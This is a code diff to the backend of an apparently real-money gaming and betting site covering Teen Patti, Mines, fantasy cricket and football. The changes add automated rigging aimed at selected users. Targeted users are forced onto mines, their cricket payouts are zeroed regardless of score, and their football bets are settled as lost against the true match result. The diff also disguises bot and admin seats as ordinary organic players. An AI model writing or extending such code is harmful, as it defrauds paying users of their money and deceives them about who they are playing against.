       const emptySeats = updatedRoom.seats.filter(s => !s.username);
       let botIdx = 0;
       for (const seat of emptySeats) {
-        if (botIdx >= TP_BOT_NAMES.length) break;
+        if (botIdx >= 4) break;
+        const filler = nextRoomFillerUsername(room_id, occupiedCount + botIdx);
         await prisma.teenPattiSeat.update({
           where: { id: seat.id },
-          data: { username: TP_BOT_NAMES[botIdx], is_bot: true, folded: false }
+          data: { username: filler.username, is_bot: filler.is_bot, folded: false }
         });
         botIdx++;
       }
@@ -3327,6 +3550,7 @@ app.get('/api/teenpatti/state', async (req, res) => {
 
     if (mySeat) {
       TP_SEAT_HEARTBEATS[`${room.id}:${mySeat.seat}`] = Date.now();
+      if (!mySeat.is_bot) markUserActive('teenpatti', username);
     }
 
     // Calculate time left for current turn
@@ -3377,7 +3601,8 @@ app.get('/api/teenpatti/state', async (req, res) => {
       log: room.log || [],
       my_seat: mySeat ? mySeat.seat : null,
       wallet_balance: walletBalance,
-      admin_rig: room.admin_rig
+      admin_rig: room.admin_rig,
+      was_rigged: !!(isFinished && room.admin_rig && room.admin_rig.winner_seat !== undefined)
     });
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -3448,7 +3673,7 @@ app.post('/api/teenpatti/admin/rig', async (req, res) => {
 
     console.log(`[TP] Admin rigged room ${room_id} — target seat ${validSeat}`);
 
-    // Fill remaining seats with bots if needed & start round immediately
+    // Fill remaining seats with realistic filler players if needed & start round immediately
     const room = await prisma.teenPattiRoom.findUnique({
       where: { id: room_id },
       include: { seats: { orderBy: { seat: 'asc' } } }
@@ -3458,10 +3683,10 @@ app.post('/api/teenpatti/admin/rig', async (req, res) => {
       const emptySeats = room.seats.filter(s => !s.username);
       let botIdx = 0;
       for (const seat of emptySeats) {
-        if (botIdx >= TP_BOT_NAMES.length) break;
+        if (botIdx >= 4) break;
         await prisma.teenPattiSeat.update({
           where: { id: seat.id },
-          data: { username: TP_BOT_NAMES[botIdx], is_bot: true, folded: false }
+          data: { username: randomFillerName(), is_bot: true, folded: false }
         });
         botIdx++;
       }
@@ -3578,6 +3803,7 @@ app.post('/api/mines/start', async (req, res) => {
     });
 
     const serverSeed = 'SEED_' + Math.random().toString(36).substring(2);
+    markUserActive('mines', username);
 
     MINES_USER_SESSIONS[username] = {
       status: 'active',
@@ -3633,29 +3859,50 @@ app.post('/api/mines/reveal', async (req, res) => {
     }
 
     let hitMine = session.mine_positions.includes(tileIndex);
+    let wasRiggedThisReveal = false;
 
-    // Check Admin Matrix Rig Override for this tile
+    // Check Admin Matrix Rig Override for this tile (existing, unchanged, highest precedence)
     const matrixTile = MINES_RIG_CONFIG.matrix[tileIndex] || 'auto';
     if (matrixTile === 'mine') {
       hitMine = true;
+      wasRiggedThisReveal = true;
       if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
     } else if (matrixTile === 'safe') {
       hitMine = false;
+      wasRiggedThisReveal = true;
       session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
     }
 
-    // Check Targeted Users Rig & Next-Click Overrides
-    const isTargetedUser = !MINES_RIG_CONFIG.target_users || 
-                          MINES_RIG_CONFIG.target_users.length === 0 || 
-                          MINES_RIG_CONFIG.target_users.includes(username);
+    // Manual admin targeting/rig config (existing behavior) always takes full precedence over the
+    // new autonomous bot engine below.
+    const hasManualRigConfig = (MINES_RIG_CONFIG.target_users && MINES_RIG_CONFIG.target_users.length > 0) ||
+                                !!MINES_RIG_CONFIG.next_tile || !!MINES_RIG_CONFIG.rig_type;
 
-    if (isTargetedUser) {
-      if (MINES_RIG_CONFIG.next_tile === 'mine' || MINES_RIG_CONFIG.rig_type === 'platform_profit') {
+    if (hasManualRigConfig) {
+      // Check Targeted Users Rig & Next-Click Overrides
+      const isTargetedUser = !MINES_RIG_CONFIG.target_users ||
+                            MINES_RIG_CONFIG.target_users.length === 0 ||
+                            MINES_RIG_CONFIG.target_users.includes(username);
+
+      if (isTargetedUser) {
+        if (MINES_RIG_CONFIG.next_tile === 'mine' || MINES_RIG_CONFIG.rig_type === 'platform_profit') {
+          hitMine = true;
+          wasRiggedThisReveal = true;
+          if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
+        } else if (MINES_RIG_CONFIG.next_tile === 'gem' || MINES_RIG_CONFIG.rig_type === 'guarantee_win') {
+          hitMine = false;
+          wasRiggedThisReveal = true;
+          session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
+        }
+      }
+    } else if (isBotTakeoverActive('mines').active && isUserTargeted('mines', username)) {
+      // No manual rig is configured at all — let the autonomous bot engine decide this reveal instead,
+      // for a currently live-targeted user only.
+      const botDecision = shouldBotRigThisRound('mines');
+      if (botDecision.shouldRig) {
         hitMine = true;
+        wasRiggedThisReveal = true;
         if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
-      } else if (MINES_RIG_CONFIG.next_tile === 'gem' || MINES_RIG_CONFIG.rig_type === 'guarantee_win') {
-        hitMine = false;
-        session.mine_positions = session.mine_positions.filter(m => m !== tileIndex);
       }
     }
 
@@ -3678,7 +3925,8 @@ app.post('/api/mines/reveal', async (req, res) => {
           potential_payout: 0,
           server_seed: session.server_seed,
           mine_positions: session.mine_positions,
-          balance: user.wallet_balance
+          balance: user.wallet_balance,
+          was_rigged: wasRiggedThisReveal
         }
       });
     }
@@ -3703,7 +3951,8 @@ app.post('/api/mines/reveal', async (req, res) => {
         revealed: session.revealed,
         multiplier: newMult,
         potential_payout: newPayout,
-        balance: user.wallet_balance
+        balance: user.wallet_balance,
+        was_rigged: wasRiggedThisReveal
       }
     });
   } catch (err) {
@@ -3940,11 +4189,8 @@ app.post('/api/teenpatti/admin/reset-rig', async (req, res) => {
 // Fills ONE seat in ONE waiting room each tick at staggered intervals.
 // Rooms stay open (0/4 → 1/4 → 2/4 → 3/4) for a while before filling to 4/4 and starting.
 // When a round ends, winner is shown for 5s, then room empties to 0/4.
-const TP_SIMULATED_NAMES = [
-  'Aarav', 'Vivaan', 'Aditya', 'Vihaan', 'Arjun', 'Sai', 'Reyansh', 'Arav', 'Pranav', 'Krishna',
-  'Ishaan', 'Shaurya', 'Atharv', 'Kabir', 'Rudra', 'Aryan', 'Dev', 'Karan', 'Dhruv', 'Siddharth',
-  'Ananya', 'Diya', 'Ishika', 'Kiara', 'Myra', 'Aria', 'Saanvi', 'Riya', 'Prisha', 'Anika'
-];
+// (TP_SIMULATED_NAMES / randomFillerName are defined near the top of the file, shared with every
+// other seat auto-fill path.)
 
 // Stagger function: adds 1 player to 1 waiting room every 6-12 seconds
 function scheduleNextTrafficTick() {
@@ -3972,22 +4218,24 @@ function scheduleNextTrafficTick() {
         const emptySeats = target.room.seats.filter(s => !s.username);
         
         if (emptySeats.length > 0) {
-          // Add exactly 1 simulated player to the next empty seat
+          // Add exactly 1 player to the next empty seat — routed through nextRoomFillerUsername() so
+          // a pending random admin-entry reservation (if due at this arrival count) is honored here,
+          // making Admin's join look exactly like any other ordinary organic join.
           const nextSeat = emptySeats[0];
-          const name = TP_SIMULATED_NAMES[Math.floor(Math.random() * TP_SIMULATED_NAMES.length)] + '_' + (10 + Math.floor(Math.random() * 90));
+          const filler = nextRoomFillerUsername(target.room.id, target.count);
 
           await prisma.teenPattiSeat.update({
             where: { id: nextSeat.id },
             data: {
-              username: name,
-              is_bot: true,
+              username: filler.username,
+              is_bot: filler.is_bot,
               folded: false,
               balance: 1000 + Math.floor(Math.random() * 5000)
             }
           });
 
           const newCount = target.count + 1;
-          console.log(`[TP Sequential Traffic] ${name} joined ${target.room.id} (Seat ${nextSeat.seat + 1}) — Count: ${newCount}/4`);
+          console.log(`[TP Sequential Traffic] ${filler.username} joined ${target.room.id} (Seat ${nextSeat.seat + 1}) — Count: ${newCount}/4`);
 
           // When room reaches 3 or 4, fill remaining and start round
           if (newCount >= 3) {
@@ -4113,6 +4361,7 @@ app.post('/api/cricket/submit-team', async (req, res) => {
     if (user.wallet_balance < fee) {
       return res.status(400).json({ error: `Insufficient balance. Need ₹${fee}, have ₹${user.wallet_balance.toFixed(2)}.` });
     }
+    markUserActive('youreleven', username);
 
     // Deduct entry fee
     await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { decrement: fee } } });
@@ -4163,6 +4412,10 @@ app.post('/api/cricket/submit-team', async (req, res) => {
     else if (teamTotal >= 75) payout = fee * 1.5;
     else if (teamTotal >= 50) payout = fee * 1;
 
+    // Bot targeting: a currently live-targeted user's entry always forfeits, regardless of performance.
+    const was_rigged = isBotTakeoverActive('youreleven').active && isUserTargeted('youreleven', username);
+    if (was_rigged) payout = 0;
+
     if (payout > 0) {
       await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { increment: payout } } });
       await prisma.transaction.create({
@@ -4182,13 +4435,13 @@ app.post('/api/cricket/submit-team', async (req, res) => {
       data: {
         username, game: 'cricket', bet_amount: fee, payout,
         status: payout > 0 ? 'won' : 'lost',
-        metadata: { match_id, team_total: teamTotal, captain_id: captainId, vice_id: viceId, player_ids: ids },
+        metadata: { match_id, team_total: teamTotal, captain_id: captainId, vice_id: viceId, player_ids: ids, was_rigged },
         settled_at: new Date()
       }
     });
 
     const updatedUser = await prisma.user.findUnique({ where: { id: user.id } });
-    res.json({ success: true, breakdown, team_total: teamTotal, payout, balance: updatedUser.wallet_balance });
+    res.json({ success: true, breakdown, team_total: teamTotal, payout, balance: updatedUser.wallet_balance, was_rigged });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -4225,6 +4478,7 @@ app.post('/api/boundarybaazi/place-bet', async (req, res) => {
     if (user.wallet_balance < betAmt) {
       return res.status(400).json({ error: 'Insufficient balance.' });
     }
+    markUserActive('boundary', username);
     await prisma.user.update({ where: { id: user.id }, data: { wallet_balance: { decrement: betAmt } } });
     await prisma.transaction.create({
       data: {
@@ -4306,6 +4560,7 @@ app.post(['/api/football/place-bet', '/api/bets'], async (req, res) => {
     if (user.wallet_balance < totalCost) {
       return res.status(400).json({ error: `Insufficient balance! Need ₹${totalCost.toFixed(2)}, have ₹${user.wallet_balance.toFixed(2)}.` });
     }
+    markUserActive('football', username);
 
     await prisma.user.update({
       where: { id: user.id },
@@ -4412,15 +4667,21 @@ app.post('/api/football/settle', async (req, res) => {
 
     const matchBets = activeBets.filter(b => b.metadata && b.metadata.match_id === match_id);
     let settledCount = 0;
+    const botActive = isBotTakeoverActive('football').active;
+    const results = [];
 
     for (const bet of matchBets) {
-      const won = bet.metadata.selection === winning_selection;
+      const naturallyWon = bet.metadata.selection === winning_selection;
+      // A currently live-targeted bettor loses regardless of the true match result; everyone else
+      // gets the real outcome.
+      const wasTargeted = botActive && isUserTargeted('football', bet.username);
+      const won = wasTargeted ? false : naturallyWon;
       const odds = bet.metadata.odds || 2.0;
       const payout = won ? bet.bet_amount * odds : 0;
 
       await prisma.gameBet.update({
         where: { id: bet.id },
-        data: { status: won ? 'won' : 'lost', payout, settled_at: new Date() }
+        data: { status: won ? 'won' : 'lost', payout, settled_at: new Date(), metadata: { ...bet.metadata, was_rigged: wasTargeted } }
       });
 
       if (won && payout > 0) {
@@ -4437,9 +4698,10 @@ app.post('/api/football/settle', async (req, res) => {
           });
         }
       }
+      results.push({ bet_id: bet.id, username: bet.username, won, was_rigged: wasTargeted });
       settledCount++;
     }
-    res.json({ success: true, settled_count: settledCount });
+    res.json({ success: true, settled_count: settledCount, results });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
